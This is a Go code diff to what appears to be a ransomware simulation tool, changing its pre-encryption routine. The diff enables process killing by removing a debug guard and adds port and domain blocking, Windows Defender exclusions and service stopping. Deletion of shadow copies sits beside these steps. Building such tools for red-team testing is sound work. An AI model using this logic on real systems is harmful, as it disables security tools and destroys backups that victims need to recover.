@@ -143,7 +143,7 @@ func replaceExtensionVariables(extension string) string {
 func preEncryptionChecks(args map[string]any, isAdmin bool, isRemoteDevice bool, config Config, decryptEnabled bool) {
 
 	var err error
-	// Delete VSS Copies on target
+	// Delete VSS Copies
 	if args["vss"].(bool) && isAdmin && !decryptEnabled {
 		printFormattedMessage("Attempting to terminate VSS Copies", INFO)
 		err = RemoveShadowCopies(isRemoteDevice)
@@ -153,15 +153,34 @@ func preEncryptionChecks(args map[string]any, isAdmin bool, isRemoteDevice bool,
 		}
 	}
 
-	// Kill processes on target
-	// TODO Remove for release
-	if args["killprocs"].(bool) && 1 == 2 && isAdmin && !decryptEnabled {
+	// Kill processes
+	if args["killprocs"].(bool) && isAdmin && !decryptEnabled {
 		printFormattedMessage("Attempting to terminate target processes", INFO)
 		err = KillTargetProcesses(config.ProcessKillNames, isRemoteDevice, "")
 		if err != nil {
 			// Non-fatal so we will continue
 			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
 		}
+	}
+
+	if args["blockports"].(bool) && isAdmin {
+		// Reversible
+		handlePortBlocking(decryptEnabled, &config)
+	}
+	if args["blockhosts"].(bool) && isAdmin {
+		// Reversible
+		// Probably better way is resolve these to IPs and then block the IPs in-line
+		// This is tricky - we don't really want to have to do this for all domains on all devices because that could be a huge spike in DNS traffic
+		// But - should we really care about DNS performance/spikes in a ransomware simulation?
+		// Plus - entries will probably be cached, so oh well
+		handleDomainBlocking(decryptEnabled, &config)
+	}
+	if args["defender"].(bool) && isAdmin {
+		// Non-Reversible
+		handleDefenderExclusions(decryptEnabled)
+	}
+	if args["killservices"].(bool) && isAdmin && !decryptEnabled {
+		stopServices(&config)
 	}
 }
 
@@ -339,4 +358,14 @@ func readFileToSlice(file string) ([]string, error) {
 		tmp = append(tmp, strings.TrimSpace(scanner.Text()))
 	}
 	return tmp, nil
+}
+
+const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+func RandStringBytes(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letterBytes[rand.Intn(len(letterBytes))]
+	}
+	return string(b)
 }
